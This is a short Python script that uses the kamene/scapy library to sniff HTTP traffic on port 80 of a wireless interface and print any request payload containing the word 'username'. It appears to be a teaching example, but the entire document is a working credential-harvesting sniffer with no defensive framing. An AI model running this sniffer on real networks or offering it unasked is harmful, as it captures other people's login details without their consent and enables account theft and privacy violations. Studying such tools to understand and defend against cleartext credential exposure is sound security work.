#!/usr/bin/env python

import kamene.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet, filter = "port 80")

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            if "username" in load:
                print(load)

if __name__ == "__main__":
    sniff("wlan0")
